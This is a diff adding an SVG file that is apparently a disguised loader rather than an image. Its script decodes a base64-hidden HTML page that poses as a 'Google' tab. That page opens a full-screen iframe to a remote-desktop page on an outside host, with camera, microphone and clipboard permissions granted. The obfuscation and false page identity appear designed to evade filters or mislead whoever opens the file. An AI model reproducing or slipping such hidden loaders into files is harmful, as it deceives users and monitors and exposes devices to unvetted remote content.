@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    xmlns:xhtml="http://www.w3.org/1999/xhtml"
+    width="100%"
+    height="100%"
+    style="display:block;margin:0;padding:0;width:100vw;height:100vh;position:fixed;top:0;left:0;overflow:hidden;background:#000;">
+
+    <foreignObject
+        x="0"
+        y="0"
+        width="100%"
+        height="100%"
+        style="overflow:visible;width:100%;height:100%;">
+
+        <xhtml:iframe
+            id="html-frame"
+            frameborder="0"
+            scrolling="auto"
+            allow="fullscreen; autoplay; gamepad; clipboard-read; clipboard-write; microphone; camera"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-pointer-lock"
+            style="
+                position:fixed;
+                inset:0;
+                width:100%;
+                height:100%;
+                border:0;
+                margin:0;
+                padding:0;
+                display:block;
+                overflow:auto;
+                z-index:999999;
+            ">
+        </xhtml:iframe>
+
+    </foreignObject>
+
+    <script><![CDATA[
+(function () {
+    const encoded = "PGh0bWw+CjxoZWFkPgogIDx0aXRsZT5Hb29nbGU8L3RpdGxlPgogIDxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIj4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWN0aXZpdHkuc2hvci5jaC9zdHlsZXMvY2xvYWsuY3NzIj4KPC9oZWFkPgo8Ym9keSBjbGFzcz0iY2xvYWstYm9keSI+CiAgPGlmcmFtZSBzcmM9Imh0dHBzOi8vYWN0aXZpdHkuc2hvci5jaC9yZW1vdGUtZGVza3RvcC5odG1sIiBzdHlsZT0iYm9yZGVyOiBub25lOyBoZWlnaHQ6IDEwMCU7IHdpZHRoOiAxMDAlOyBwb3NpdGlvbjogZml4ZWQ7IGxlZnQ6IDA7IHRvcDogMDsiIGNsYXNzPSJjbG9hay1mcmFtZSI+PC9pZnJhbWU+CjwvYm9keT4KPC9odG1sPg==";
+    const binary = atob(encoded);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+    }
+    const html = new TextDecoder("utf-8").decode(bytes);
+    const frame = document.getElementById("html-frame");
+    if (!frame) return;
+    frame.srcdoc = html;
+})();
+    ]]></script>
+</svg>
